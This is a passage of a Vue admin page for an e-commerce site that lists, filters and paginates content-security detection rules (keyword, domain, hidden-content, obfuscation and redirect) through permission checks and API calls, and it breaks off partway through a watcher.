<!-- File: /pages/admin/content-security/index.vue -->
<script setup lang="ts">
import { ref, computed, watch, onMounted } from 'vue';
import { useRoute, useRouter } from '#app';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  AlertOctagon, 
  CheckCircle2, 
  Search, 
  Play, 
  RefreshCw, 
  Filter, 
  Layers, 
  Package, 
  ExternalLink, 
  Eye, 
  Edit3, 
  Check, 
  X, 
  Plus, 
  Trash2, 
  Code2, 
  Globe2, 
  FileText, 
  SlidersHorizontal, 
  ArrowRight, 
  Info,
  Clock,
  Sparkles,
  ChevronRight,
  MoreVertical,
  RotateCcw,
  Loader2,
  Calendar,
  User,
  Hash,
  Activity,
  FileCode,
  CheckCircle,
  XCircle,
  AlertCircle
} from 'lucide-vue-next';
import { cn } from '@/utils';
import { toastSuccess, toastInfo, toastWarning, toastError, extractErrorMessage } from '@/composables/useToast';
import UiTable, { type UiTableColumn } from '@/components/ui/UiTable.vue';
import UiPagination from '@/components/ui/UiPagination.vue';
import UiAdminModal from '@/components/ui/UiAdminModal.vue';
import UiBadge from '@/components/ui/UiBadge.vue';
import UiButton from '@/components/ui/Button.vue';
import { refDebounced } from '@vueuse/core';
import { useContentSecurityService } from '@/composables/useContentSecurityService';
import { useAdminPermissions } from '@/composables/useAdminPermissions';
import { useAdminModalState } from '@/composables/useAdminModalState';
import type { 
  KeywordRule, 
  KeywordRuleDetail, 
  KeywordCategory, 
  KeywordMatchType, 
  KeywordSeverity, 
  CreateKeywordRulePayload,
  UpdateKeywordRulePayload,
  DomainRule,
  DomainRuleDetail,
  DomainMatchType,
  CreateDomainRulePayload,
  UpdateDomainRulePayload,
  DomainRulesQueryParams,
  HiddenContentRule,
  HiddenContentRuleDetail,
  CreateHiddenContentRulePayload,
  UpdateHiddenContentRulePayload,
  HiddenContentRulesQueryParams,
  ObfuscationRule,
  ObfuscationRuleDetail,
  CreateObfuscationRulePayload,
  UpdateObfuscationRulePayload,
  ObfuscationRulesQueryParams,
  RedirectRule,
  CreateRedirectRulePayload,
  RedirectRulesQueryParams
} from '@/types';

definePageMeta({
  layout: 'admin'
});

useSeoMeta({
  title: 'Content Security - Best Computer Hub Admin',
  robots: 'noindex, nofollow'
});

// ==========================================
// Types
// ==========================================
export type SecurityStatus = 'Clean' | 'Needs Review' | 'High Risk' | 'Critical' | 'Resolved';
export type SecuritySeverity = 'Low' | 'Medium' | 'High' | 'Critical';
export type ContentType = 'Product' | 'Category';
export type DetectorType = 'Keyword' | 'Domain' | 'HTML' | 'Attribute' | 'Redirect' | 'Hidden Content' | 'Obfuscation';

export interface SecurityFinding {
  id: string;
  contentType: ContentType;
  contentId: string | number;
  contentName: string;
  contentSlug: string;
  categoryName?: string;
  field: string;
  riskScore: number;
  status: SecurityStatus;
  severity: SecuritySeverity;
  detector: DetectorType;
  ruleName: string;
  description: string;
  matchedValue: string;
  contextSnippetBefore: string;
  contextSnippetMatched: string;
  contextSnippetAfter: string;
  lineOffset: number;
  scannedAt: string;
  storefrontUrl: string;
  adminEditUrl: string;
}

export interface DetectionRule {
  id: string;
  type: 'keyword' | 'domain' | 'hidden_content' | 'obfuscation' | 'html' | 'attribute' | 'redirect';
  pattern: string;
  category: string;
  severity: SecuritySeverity;
  description: string;
  enabled: boolean;
  matchCount: number;
  updatedAt: string;
}

// ==========================================
// State Management
// ==========================================
const mainTab = ref<'overview' | 'results' | 'rules'>('overview');
const rulesSubTab = ref<'keywords' | 'domains' | 'hidden_content' | 'obfuscation' | 'html' | 'attributes' | 'redirects'>('keywords');

const { hasPermission } = useAdminPermissions();
const canViewKeywords = computed(() => hasPermission('content_security.view_keywordrule'));
const canAddKeywordRule = computed(() => hasPermission('content_security.add_keywordrule'));
const canEditKeywordRule = computed(() => hasPermission('content_security.change_keywordrule'));
const canDeleteKeywordRule = computed(() => hasPermission('content_security.delete_keywordrule'));

const canViewDomains = computed(() => hasPermission('content_security.view_domainrule'));
const canAddDomainRule = computed(() => hasPermission('content_security.add_domainrule'));
const canEditDomainRule = computed(() => hasPermission('content_security.change_domainrule'));
const canDeleteDomainRule = computed(() => hasPermission('content_security.delete_domainrule'));

const canViewHiddenContent = computed(() => hasPermission('content_security.view_hiddencontentrule'));
const canAddHiddenContentRule = computed(() => hasPermission('content_security.add_hiddencontentrule'));
const canEditHiddenContentRule = computed(() => hasPermission('content_security.change_hiddencontentrule'));
const canDeleteHiddenContentRule = computed(() => hasPermission('content_security.delete_hiddencontentrule'));

const canViewObfuscation = computed(() => hasPermission('content_security.view_obfuscationrule'));
const canAddObfuscationRule = computed(() => hasPermission('content_security.add_obfuscationrule'));
const canEditObfuscationRule = computed(() => hasPermission('content_security.change_obfuscationrule'));
const canDeleteObfuscationRule = computed(() => hasPermission('content_security.delete_obfuscationrule'));

const canViewRedirects = computed(() => hasPermission('content_security.view_redirectrule'));
const canAddRedirectRule = computed(() => hasPermission('content_security.add_redirectrule'));
const canEditRedirectRule = computed(() => hasPermission('content_security.change_redirectrule'));
const canDeleteRedirectRule = computed(() => hasPermission('content_security.delete_redirectrule'));

const contentSecurityService = useContentSecurityService();
const isKeywordsLoading = computed(() => contentSecurityService.isLoading.value);
const keywordsError = computed(() => contentSecurityService.error.value);

// Keyword Rules Query/Data States
const keywordSearchQuery = ref('');
const debouncedKeywordSearch = refDebounced(keywordSearchQuery, 300);
const keywordCategory = ref<string>('all');
const keywordSeverity = ref<string>('all');
const keywordMatchType = ref<string>('all');
const keywordIsActive = ref<string>('all');
const keywordIsEnabled = ref<string>('all');
const keywordOrdering = ref<string>('-created_at');
const keywordPage = ref(1);
const keywordPageSize = ref(10);
const keywordRulesData = ref<KeywordRule[]>([]);
const keywordRulesCount = ref(0);
const keywordRulesPages = ref(1);

const keywordRuleColumns: UiTableColumn<KeywordRule>[] = [
  { key: 'keyword', label: 'Keyword', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'match_type', label: 'Match Type', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetKeywordFilters = () => {
  keywordSearchQuery.value = '';
  keywordCategory.value = 'all';
  keywordSeverity.value = 'all';
  keywordMatchType.value = 'all';
  keywordIsActive.value = 'all';
  keywordIsEnabled.value = 'all';
  keywordOrdering.value = '-created_at';
  keywordPage.value = 1;
};

const fetchKeywordRules = async () => {
  if (!canViewKeywords.value) return;
  
  const params: any = {
    page: keywordPage.value,
    page_size: keywordPageSize.value,
    ordering: keywordOrdering.value
  };

  if (debouncedKeywordSearch.value.trim()) {
    params.search = debouncedKeywordSearch.value.trim();
  }
  if (keywordCategory.value !== 'all') {
    params.category = keywordCategory.value;
  }
  if (keywordSeverity.value !== 'all') {
    params.severity = keywordSeverity.value;
  }
  if (keywordMatchType.value !== 'all') {
    params.match_type = keywordMatchType.value;
  }
  if (keywordIsActive.value !== 'all') {
    params.is_active = keywordIsActive.value === 'true';
  }
  if (keywordIsEnabled.value !== 'all') {
    params.is_enabled = keywordIsEnabled.value === 'true';
  }

  const response = await contentSecurityService.getKeywordRules(params);
  keywordRulesData.value = response.results;
  keywordRulesCount.value = response.count;
  keywordRulesPages.value = response.pages;
};

// Domain Rules Query/Data States
const isDomainsLoading = ref(false);
const domainsError = ref<string | null>(null);
const domainSearchQuery = ref('');
const debouncedDomainSearch = refDebounced(domainSearchQuery, 300);
const domainCategory = ref<string>('all');
const domainSeverity = ref<string>('all');
const domainMatchType = ref<string>('all');
const domainIsActive = ref<string>('all');
const domainIsEnabled = ref<string>('all');
const domainOrdering = ref<string>('-created_at');
const domainPage = ref(1);
const domainPageSize = ref(10);
const domainRulesData = ref<DomainRule[]>([]);
const domainRulesCount = ref(0);
const domainRulesPages = ref(1);

const domainRuleColumns: UiTableColumn<DomainRule>[] = [
  { key: 'domain', label: 'Domain', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'match_type', label: 'Match Type', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetDomainFilters = () => {
  domainSearchQuery.value = '';
  domainCategory.value = 'all';
  domainSeverity.value = 'all';
  domainMatchType.value = 'all';
  domainIsActive.value = 'all';
  domainIsEnabled.value = 'all';
  domainOrdering.value = '-created_at';
  domainPage.value = 1;
};

const fetchDomainRules = async () => {
  if (!canViewDomains.value) return;
  
  isDomainsLoading.value = true;
  domainsError.value = null;

  try {
    const params: DomainRulesQueryParams = {
      page: domainPage.value,
      page_size: domainPageSize.value,
      ordering: domainOrdering.value
    };

    if (debouncedDomainSearch.value.trim()) {
      params.search = debouncedDomainSearch.value.trim();
    }
    if (domainCategory.value !== 'all') {
      params.category = domainCategory.value as KeywordCategory;
    }
    if (domainSeverity.value !== 'all') {
      params.severity = domainSeverity.value as KeywordSeverity;
    }
    if (domainMatchType.value !== 'all') {
      params.match_type = domainMatchType.value as DomainMatchType;
    }
    if (domainIsActive.value !== 'all') {
      params.is_active = domainIsActive.value === 'true';
    }
    if (domainIsEnabled.value !== 'all') {
      params.is_enabled = domainIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getDomainRules(params);
    domainRulesData.value = response.results;
    domainRulesCount.value = response.count;
    domainRulesPages.value = response.pages;
  } catch (err: any) {
    domainsError.value = extractErrorMessage(err, 'Failed to retrieve domain rules.');
  } finally {
    isDomainsLoading.value = false;
  }
};

// Hidden Content Rules Query/Data States
const isHiddenContentLoading = ref(false);
const hiddenContentError = ref<string | null>(null);
const hiddenContentSearchQuery = ref('');
const debouncedHiddenContentSearch = refDebounced(hiddenContentSearchQuery, 300);
const hiddenContentCategory = ref<string>('all');
const hiddenContentSeverity = ref<string>('all');
const hiddenContentIsActive = ref<string>('all');
const hiddenContentIsEnabled = ref<string>('all');
const hiddenContentOrdering = ref<string>('-created_at');
const hiddenContentPage = ref(1);
const hiddenContentPageSize = ref(10);
const hiddenContentRulesData = ref<HiddenContentRule[]>([]);
const hiddenContentRulesCount = ref(0);
const hiddenContentRulesPages = ref(1);

const hiddenContentRuleColumns: UiTableColumn<HiddenContentRule>[] = [
  { key: 'pattern', label: 'CSS Declaration / Pattern', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetHiddenContentFilters = () => {
  hiddenContentSearchQuery.value = '';
  hiddenContentCategory.value = 'all';
  hiddenContentSeverity.value = 'all';
  hiddenContentIsActive.value = 'all';
  hiddenContentIsEnabled.value = 'all';
  hiddenContentOrdering.value = '-created_at';
  hiddenContentPage.value = 1;
};

const fetchHiddenContentRules = async () => {
  if (!canViewHiddenContent.value) return;
  
  isHiddenContentLoading.value = true;
  hiddenContentError.value = null;

  try {
    const params: HiddenContentRulesQueryParams = {
      page: hiddenContentPage.value,
      page_size: hiddenContentPageSize.value,
      ordering: hiddenContentOrdering.value
    };

    if (debouncedHiddenContentSearch.value.trim()) {
      params.search = debouncedHiddenContentSearch.value.trim();
    }
    if (hiddenContentCategory.value !== 'all') {
      params.category = hiddenContentCategory.value as KeywordCategory;
    }
    if (hiddenContentSeverity.value !== 'all') {
      params.severity = hiddenContentSeverity.value as KeywordSeverity;
    }
    if (hiddenContentIsActive.value !== 'all') {
      params.is_active = hiddenContentIsActive.value === 'true';
    }
    if (hiddenContentIsEnabled.value !== 'all') {
      params.is_enabled = hiddenContentIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getHiddenContentRules(params);
    hiddenContentRulesData.value = response.results;
    hiddenContentRulesCount.value = response.count;
    hiddenContentRulesPages.value = response.pages;
  } catch (err: any) {
    hiddenContentError.value = extractErrorMessage(err, 'Failed to retrieve hidden content rules.');
  } finally {
    isHiddenContentLoading.value = false;
  }
};

// Obfuscation Rules Query/Data States
const isObfuscationLoading = ref(false);
const obfuscationError = ref<string | null>(null);
const obfuscationSearchQuery = ref('');
const debouncedObfuscationSearch = refDebounced(obfuscationSearchQuery, 300);
const obfuscationCategory = ref<string>('all');
const obfuscationSeverity = ref<string>('all');
const obfuscationIsActive = ref<string>('all');
const obfuscationIsEnabled = ref<string>('all');
const obfuscationOrdering = ref<string>('-created_at');
const obfuscationPage = ref(1);
const obfuscationPageSize = ref(10);
const obfuscationRulesData = ref<ObfuscationRule[]>([]);
const obfuscationRulesCount = ref(0);
const obfuscationRulesPages = ref(1);

const obfuscationRuleColumns: UiTableColumn<ObfuscationRule>[] = [
  { key: 'pattern', label: 'Obfuscation Pattern / Regex', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetObfuscationFilters = () => {
  obfuscationSearchQuery.value = '';
  obfuscationCategory.value = 'all';
  obfuscationSeverity.value = 'all';
  obfuscationIsActive.value = 'all';
  obfuscationIsEnabled.value = 'all';
  obfuscationOrdering.value = '-created_at';
  obfuscationPage.value = 1;
};

const fetchObfuscationRules = async () => {
  if (!canViewObfuscation.value) return;
  
  isObfuscationLoading.value = true;
  obfuscationError.value = null;

  try {
    const params: ObfuscationRulesQueryParams = {
      page: obfuscationPage.value,
      page_size: obfuscationPageSize.value,
      ordering: obfuscationOrdering.value
    };

    if (debouncedObfuscationSearch.value.trim()) {
      params.search = debouncedObfuscationSearch.value.trim();
    }
    if (obfuscationCategory.value !== 'all') {
      params.category = obfuscationCategory.value as KeywordCategory;
    }
    if (obfuscationSeverity.value !== 'all') {
      params.severity = obfuscationSeverity.value as KeywordSeverity;
    }
    if (obfuscationIsActive.value !== 'all') {
      params.is_active = obfuscationIsActive.value === 'true';
    }
    if (obfuscationIsEnabled.value !== 'all') {
      params.is_enabled = obfuscationIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getObfuscationRules(params);
    obfuscationRulesData.value = response.results;
    obfuscationRulesCount.value = response.count;
    obfuscationRulesPages.value = response.pages;
  } catch (err: any) {
    obfuscationError.value = extractErrorMessage(err, 'Failed to retrieve obfuscation rules.');
  } finally {
    isObfuscationLoading.value = false;
  }
};

// Redirect Rules Query/Data States
const isRedirectsLoading = ref(false);
const redirectsError = ref<string | null>(null);
const redirectSearchQuery = ref('');
const debouncedRedirectSearch = refDebounced(redirectSearchQuery, 300);
const redirectCategory = ref<string>('all');
const redirectSeverity = ref<string>('all');
const redirectIsActive = ref<string>('all');
const redirectIsEnabled = ref<string>('all');
const redirectOrdering = ref<string>('-created_at');
const redirectPage = ref(1);
const redirectPageSize = ref(10);
const redirectRulesData = ref<RedirectRule[]>([]);
const redirectRulesCount = ref(0);
const redirectRulesPages = ref(1);

const redirectRuleColumns: UiTableColumn<RedirectRule>[] = [
  { key: 'pattern', label: 'Redirect Pattern / Heuristic', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' }
];

const resetRedirectFilters = () => {
  redirectSearchQuery.value = '';
  redirectCategory.value = 'all';
  redirectSeverity.value = 'all';
  redirectIsActive.value = 'all';
  redirectIsEnabled.value = 'all';
  redirectOrdering.value = '-created_at';
  redirectPage.value = 1;
};

const fetchRedirectRules = async () => {
  if (!canViewRedirects.value) return;
  
  isRedirectsLoading.value = true;
  redirectsError.value = null;

  try {
    const params: RedirectRulesQueryParams = {
      page: redirectPage.value,
      page_size: redirectPageSize.value,
      ordering: redirectOrdering.value
    };

    if (debouncedRedirectSearch.value.trim()) {
      params.search = debouncedRedirectSearch.value.trim();
    }
    if (redirectCategory.value !== 'all') {
      params.category = redirectCategory.value as KeywordCategory;
    }
    if (redirectSeverity.value !== 'all') {
      params.severity = redirectSeverity.value as KeywordSeverity;
    }
    if (redirectIsActive.value !== 'all') {
      params.is_active = redirectIsActive.value === 'true';
    }
    if (redirectIsEnabled.value !== 'all') {
      params.is_enabled = redirectIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getRedirectRules(params);
    redirectRulesData.value = response.results;
    redirectRulesCount.value = response.count;
    redirectRulesPages.value = response.pages;
  } catch (err: any) {
    redirectsError.value = extractErrorMessage(err, 'Failed to retrieve redirect rules.');
  } finally {
    isRedirectsLoading.value = false;
  }
};

// URL Routing/Query Management
const route = useRoute();
const router = useRouter();

const syncFromRoute = () => {
  if (route.query.mainTab) mainTab.value = route.query.mainTab as any;
  if (route.query.subTab) {
    if (route.query.subTab === 'hidden-content') {
      rulesSubTab.value = 'hidden_content';
    } else {
      rulesSubTab.value = route.query.subTab as any;
    }
  }

  if (rulesSubTab.value === 'domains') {
    if (route.query.search) domainSearchQuery.value = String(route.query.search);
    if (route.query.category) domainCategory.value = String(route.query.category);
    if (route.query.severity) domainSeverity.value = String(route.query.severity);
    if (route.query.match_type) domainMatchType.value = String(route.query.match_type);
    if (route.query.is_active) domainIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) domainIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) domainOrdering.value = String(route.query.ordering);
    if (route.query.page) domainPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) domainPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'hidden_content') {
    if (route.query.search) hiddenContentSearchQuery.value = String(route.query.search);
    if (route.query.category) hiddenContentCategory.value = String(route.query.category);
    if (route.query.severity) hiddenContentSeverity.value = String(route.query.severity);
    if (route.query.is_active) hiddenContentIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) hiddenContentIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) hiddenContentOrdering.value = String(route.query.ordering);
    if (route.query.page) hiddenContentPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) hiddenContentPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'obfuscation') {
    if (route.query.search) obfuscationSearchQuery.value = String(route.query.search);
    if (route.query.category) obfuscationCategory.value = String(route.query.category);
    if (route.query.severity) obfuscationSeverity.value = String(route.query.severity);
    if (route.query.is_active) obfuscationIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) obfuscationIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) obfuscationOrdering.value = String(route.query.ordering);
    if (route.query.page) obfuscationPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) obfuscationPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'redirects') {
    if (route.query.search) redirectSearchQuery.value = String(route.query.search);
    if (route.query.category) redirectCategory.value = String(route.query.category);
    if (route.query.severity) redirectSeverity.value = String(route.query.severity);
    if (route.query.is_active) redirectIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) redirectIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) redirectOrdering.value = String(route.query.ordering);
    if (route.query.page) redirectPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) redirectPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else {
    if (route.query.search) keywordSearchQuery.value = String(route.query.search);
    if (route.query.category) keywordCategory.value = String(route.query.category);
    if (route.query.severity) keywordSeverity.value = String(route.query.severity);
    if (route.query.match_type) keywordMatchType.value = String(route.query.match_type);
    if (route.query.is_active) keywordIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) keywordIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) keywordOrdering.value = String(route.query.ordering);
    if (route.query.page) keywordPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) keywordPageSize.value = parseInt(String(route.query.page_size)) || 10;
  }
};

const updateRouteQuery = () => {
  const query: Record<string, any> = { ...route.query };

  query.mainTab = mainTab.value !== 'overview' ? mainTab.value : undefined;
  query.subTab = mainTab.value === 'rules' && rulesSubTab.value !== 'keywords' ? rulesSubTab.value : undefined;

  if (mainTab.value === 'rules' && rulesSubTab.value === 'keywords') {
    query.search = keywordSearchQuery.value || undefined;
    query.category = keywordCategory.value !== 'all' ? keywordCategory.value : undefined;
    query.severity = keywordSeverity.value !== 'all' ? keywordSeverity.value : undefined;
    query.match_type = keywordMatchType.value !== 'all' ? keywordMatchType.value : undefined;
    query.is_active = keywordIsActive.value !== 'all' ? keywordIsActive.value : undefined;
    query.is_enabled = keywordIsEnabled.value !== 'all' ? keywordIsEnabled.value : undefined;
    query.ordering = keywordOrdering.value !== '-created_at' ? keywordOrdering.value : undefined;
    query.page = keywordPage.value !== 1 ? String(keywordPage.value) : undefined;
    query.page_size = keywordPageSize.value !== 10 ? String(keywordPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'domains') {
    query.search = domainSearchQuery.value || undefined;
    query.category = domainCategory.value !== 'all' ? domainCategory.value : undefined;
    query.severity = domainSeverity.value !== 'all' ? domainSeverity.value : undefined;
    query.match_type = domainMatchType.value !== 'all' ? domainMatchType.value : undefined;
    query.is_active = domainIsActive.value !== 'all' ? domainIsActive.value : undefined;
    query.is_enabled = domainIsEnabled.value !== 'all' ? domainIsEnabled.value : undefined;
    query.ordering = domainOrdering.value !== '-created_at' ? domainOrdering.value : undefined;
    query.page = domainPage.value !== 1 ? String(domainPage.value) : undefined;
    query.page_size = domainPageSize.value !== 10 ? String(domainPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'hidden_content') {
    query.search = hiddenContentSearchQuery.value || undefined;
    query.category = hiddenContentCategory.value !== 'all' ? hiddenContentCategory.value : undefined;
    query.severity = hiddenContentSeverity.value !== 'all' ? hiddenContentSeverity.value : undefined;
    delete query.match_type;
    query.is_active = hiddenContentIsActive.value !== 'all' ? hiddenContentIsActive.value : undefined;
    query.is_enabled = hiddenContentIsEnabled.value !== 'all' ? hiddenContentIsEnabled.value : undefined;
    query.ordering = hiddenContentOrdering.value !== '-created_at' ? hiddenContentOrdering.value : undefined;
    query.page = hiddenContentPage.value !== 1 ? String(hiddenContentPage.value) : undefined;
    query.page_size = hiddenContentPageSize.value !== 10 ? String(hiddenContentPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'obfuscation') {
    query.search = obfuscationSearchQuery.value || undefined;
    query.category = obfuscationCategory.value !== 'all' ? obfuscationCategory.value : undefined;
    query.severity = obfuscationSeverity.value !== 'all' ? obfuscationSeverity.value : undefined;
    delete query.match_type;
    query.is_active = obfuscationIsActive.value !== 'all' ? obfuscationIsActive.value : undefined;
    query.is_enabled = obfuscationIsEnabled.value !== 'all' ? obfuscationIsEnabled.value : undefined;
    query.ordering = obfuscationOrdering.value !== '-created_at' ? obfuscationOrdering.value : undefined;
    query.page = obfuscationPage.value !== 1 ? String(obfuscationPage.value) : undefined;
    query.page_size = obfuscationPageSize.value !== 10 ? String(obfuscationPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'redirects') {
    query.search = redirectSearchQuery.value || undefined;
    query.category = redirectCategory.value !== 'all' ? redirectCategory.value : undefined;
    query.severity = redirectSeverity.value !== 'all' ? redirectSeverity.value : undefined;
    delete query.match_type;
    query.is_active = redirectIsActive.value !== 'all' ? redirectIsActive.value : undefined;
    query.is_enabled = redirectIsEnabled.value !== 'all' ? redirectIsEnabled.value : undefined;
    query.ordering = redirectOrdering.value !== '-created_at' ? redirectOrdering.value : undefined;
    query.page = redirectPage.value !== 1 ? String(redirectPage.value) : undefined;
    query.page_size = redirectPageSize.value !== 10 ? String(redirectPageSize.value) : undefined;
  } else {
    delete query.search;
    delete query.category;
    delete query.severity;
    delete query.match_type;
    delete query.is_active;
    delete query.is_enabled;
    delete query.ordering;
    delete query.page;
    delete query.page_size;
  }

  router.replace({ query });
};

// Initial Sync
onMounted(() => {
  syncFromRoute();
  if (canViewKeywords.value) {
    fetchKeywordRules();
  }
  if (canViewDomains.value) {
    fetchDomainRules();
  }
  if (canViewHiddenContent.value) {
    fetchHiddenContentRules();
  }
  if (canViewObfuscation.value) {
    fetchObfuscationRules();
  }
  if (canViewRedirects.value) {
    fetchRedirectRules();
  }
});

// Reactively watch keyword filters & trigger fetch
watch(
  [
    debouncedKeywordSearch,
    keywordCategory,
    keywordSeverity,
    keywordMatchType,
    keywordIsActive,
    keywordIsEnabled,
    keywordOrdering,
    keywordPageSize
  ],
  () => {
    keywordPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'keywords') {
      fetchKeywordRules();
    }
  }
);

watch(keywordPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'keywords') {
    fetchKeywordRules();
  }
});

// Reactively watch domain filters & trigger fetch
watch(
  [
    debouncedDomainSearch,
    domainCategory,
    domainSeverity,
    domainMatchType,
    domainIsActive,
    domainIsEnabled,
    domainOrdering,
    domainPageSize
  ],
  () => {
    domainPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'domains') {
      fetchDomainRules();
    }
  }
);

watch(domainPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'domains') {
    fetchDomainRules();
  }
});

// Reactively watch hidden content filters & trigger fetch
watch(
  [
    debouncedHiddenContentSearch,
    hiddenContentCategory,
    hiddenContentSeverity,
    hiddenContentIsActive,
    hiddenContentIsEnabled,
    hiddenContentOrdering,
    hiddenContentPageSize
  ],
  () => {
    hiddenContentPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'hidden_content') {
      fetchHiddenContentRules();
    }
  }
);

watch(hiddenContentPage, () => {
  updateRouteQuery();
